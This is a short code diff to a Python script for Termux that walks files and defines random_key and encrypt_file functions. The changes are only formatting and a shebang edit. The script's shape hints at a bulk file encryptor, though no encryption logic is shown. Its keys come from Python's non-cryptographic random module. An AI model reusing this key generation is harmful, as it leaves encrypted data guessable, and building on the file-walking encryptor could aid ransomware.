@@ -1,4 +1,4 @@
-#!/data/data/com.termux/files/usr/bin/env python3
+#!/data/data/com.termux/files/usr/bin/env python
 import os
 import random
 import string
@@ -11,7 +11,9 @@ from fastwalk import walk_files
 
 
 def random_key(length=32):
-    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
+    return "".join(
+        random.choice(string.ascii_letters + string.digits)
+        for _ in range(length))
 
 
 def encrypt_file(file_path, key):
